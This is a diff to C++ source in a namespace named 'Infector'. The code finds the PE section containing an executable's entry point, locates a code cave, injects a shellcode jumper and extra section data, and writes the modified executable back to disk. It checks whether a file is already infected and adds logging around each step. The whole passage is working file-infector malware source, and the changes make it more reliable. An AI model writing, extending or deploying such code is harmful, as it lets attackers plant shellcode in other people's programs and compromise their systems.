@@ -233,21 +233,28 @@ namespace Infector
             pCurrentOriginalSection++;
         }
 
-        // Search for code cave in .text section
+
+        // Search for code cave in .text section (or any other section that starting the main function)
+        bool foundMainSection = false;
         PIMAGE_SECTION_HEADER pInfectedTextSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
         for (size_t i = 0; i < pInfectedNtHeaders->FileHeader.NumberOfSections; i++)
         {
             if (pInfectedTextSection->VirtualAddress <= pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint && pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint <= (pInfectedTextSection->VirtualAddress + pInfectedTextSection->Misc.VirtualSize))
             {
+                foundMainSection = true;
                 break;
             }
 
             pInfectedTextSection++;
         }
+        if (!foundMainSection)
+            return false;
+
         const unsigned char codeCaveValue = 0x00;
         unsigned long foundCodeCaveIndex = -1;
         for (size_t i = 0; i < pInfectedTextSection->SizeOfRawData - shellcodeJumperBufferSize; i++)
         {
+
             bool foundPattern = true;
             for (size_t j = 0; j < shellcodeJumperBufferSize; j++)
             {
@@ -268,6 +275,7 @@ namespace Infector
         // Dont forget to cleanup data
         if (foundCodeCaveIndex == -1)
             return false;
+        
 
         ULONG_PTR codeCaveVirtualAddress = foundCodeCaveIndex + pInfectedTextSection->VirtualAddress;
 
@@ -320,29 +328,38 @@ namespace Infector
         bool succeed = false;
         do
         {
+            LOG("GetExecutableShellcodeDataToInject");
             if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
             {
+                LOG("Failed GetExecutableShellcodeDataToInject");
                 break;
             }
 
-            // don't forget to do cleanup after
+            LOG("GetFileData");
             if (!GetFileData(path, &executableBuffer, &executableBufferSize))
             {
+                LOG("Failed GetFileData");
                 break;
             }
 
+            LOG("IsExecutableInfected");
             if (IsExecutableInfected(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &executableBuffer, &executableBufferSize))
             {
+                LOG("Failed IsExecutableInfected");
                 break;
             }
 
+            LOG("InfectExecutable");
             if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
             {
+                LOG("Failed InfectExecutable");
                 break;
             }
 
+            LOG("SetFileData");
             if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
             {
+                LOG("Failed SetFileData");
                 break;
             }
 
